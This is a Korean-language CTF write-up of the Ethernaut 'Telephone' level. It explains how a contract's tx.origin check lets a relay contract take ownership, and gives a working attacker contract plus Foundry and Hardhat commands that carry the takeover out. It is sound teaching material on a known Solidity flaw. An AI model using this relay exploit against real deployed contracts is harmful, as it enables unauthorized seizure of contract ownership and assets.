# Telephone — 소유권 획득 (정리)

문제 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

핵심 요지
- 목표: 컨트랙트의 `owner`가 되면 성공.
- `changeOwner` 함수는 `if (tx.origin != msg.sender)` 조건을 확인한 뒤 `owner = _owner`를 수행합니다.

중요한 점(정확한 동작)
- `tx.origin`은 트랜잭션의 원래 발신자(EOA)를 의미합니다. `msg.sender`는 현재 함수 호출자의 주소입니다.
- `tx.origin != msg.sender` 조건이 참이려면, 호출 흐름이 "EOA → 공격자 컨트랙트 → target.changeOwner(...)" 처럼 중간에 컨트랙트를 거쳐야 합니다. 즉, EOA가 직접 `changeOwner`를 호출하면 `tx.origin == msg.sender`가 되어 조건이 거짓이므로 소유권이 바뀌지 않습니다.

따라서 올바른 공격 방법(요약)
1. 공격용(중계) 컨트랙트를 배포한다.
2. 그 컨트랙트에서 대상 컨트랙트의 `changeOwner`를 호출하도록 한다(인자로 내 EOA 주소 전달).
3. EOA가 공격 컨트랙트의 메서드를 호출하면, 공격 컨트랙트가 대상 컨트랙트에 호출을 전파하고, 대상 내부에서 `msg.sender`는 공격 컨트랙트 주소가 되므로 `tx.origin != msg.sender`가 되어 조건이 참이 된다. 그러면 `owner`가 EOA(인자로 전달한 주소)로 설정된다.

공격용 컨트랙트 (예시)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    ITelephone public target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    // EOA가 이 함수를 호출하면 이 컨트랙트가 target.changeOwner(_owner)로 중계
    function attack(address _owner) public {
        target.changeOwner(_owner);
    }
}
```

예시 절차 (Foundry / cast)

1) 공격 컨트랙트 배포 (forge create 사용 예시)

```bash
forge create --rpc-url <RPC_URL> --private-key $PRIVATE_KEY \
  src/04_Telephone/TelephoneAttacker.sol:TelephoneAttacker \
  --constructor-args <TARGET_CONTRACT_ADDRESS>
```

위 명령으로 반환된 공격 컨트랙트 주소를 `ATTACK_ADDR`라 하자.

2) EOA가 공격 컨트랙트의 `attack`을 호출하여 소유권을 내 EOA로 설정

```bash
cast send <ATTACK_ADDR> --rpc-url <RPC_URL> --private-key $PRIVATE_KEY "attack(address)" 0xYourEOA
```

3) 변경 확인

```bash
cast call <TARGET_CONTRACT_ADDRESS> "owner()(address)" --rpc-url <RPC_URL>
```

대체(간단) 방법 — Hardhat/ethers 콘솔 예시

```javascript
// 1) 배포
const Attacker = await ethers.getContractFactory("TelephoneAttacker");
const attacker = await Attacker.deploy(targetAddress);
await attacker.deployed();

// 2) EOA가 중계 호출
await attacker.attack(await ethers.provider.getSigner().getAddress());

// 3) 확인
const owner = await target.owner();
console.log("owner:", owner);
```

포인트 요약
- `tx.origin != msg.sender` 조건 때문에 직접 EOA로 호출하면 안 되며, 반드시 중계 컨트랙트를 통해 호출해야 합니다.
- 공격 컨트랙트는 단순히 `changeOwner`를 호출하는 역할이면 충분합니다.

법적/안전 고지
- 이 문서는 학습/CTF 용도로만 작성되었습니다. 타인의 메인넷 자산에 대해 무단으로 공격을 시도하면 법적 책임이 발생할 수 있습니다.
